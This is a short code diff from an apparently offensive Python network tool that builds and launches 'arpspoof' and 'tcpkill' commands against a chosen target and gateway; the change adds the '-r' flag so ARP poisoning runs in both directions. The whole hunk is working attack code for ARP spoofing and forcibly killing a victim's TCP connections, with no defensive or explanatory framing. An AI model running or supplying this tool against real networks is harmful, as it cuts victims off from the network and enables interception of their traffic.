@@ -85,7 +85,7 @@ def main():
 	kout.out('\tinterface: %s\n' %INTERFACE)
 	kout.out('\tgateway  : %s\n' %GATEWAY)
 	kout.out('\ttarget   : %s\n' %TARGET)
-	cmd_arpspoof = 'arpspoof -i %s -t %s %s' %(INTERFACE, GATEWAY, TARGET)
+	cmd_arpspoof = 'arpspoof -i %s -t %s %s -r' %(INTERFACE, GATEWAY, TARGET)
 	cmd_tcpkill  = 'tcpkill -i %s net %s' %(INTERFACE, TARGET)
 	run_arpspoof = lambda : sp.Popen(cmd_arpspoof.split(), stdout=sp.PIPE, stderr=sp.PIPE, shell=False)
 	run_tcpkill  = lambda : sp.Popen(cmd_tcpkill.split(), stdout=sp.PIPE, stderr=sp.PIPE, shell=False)
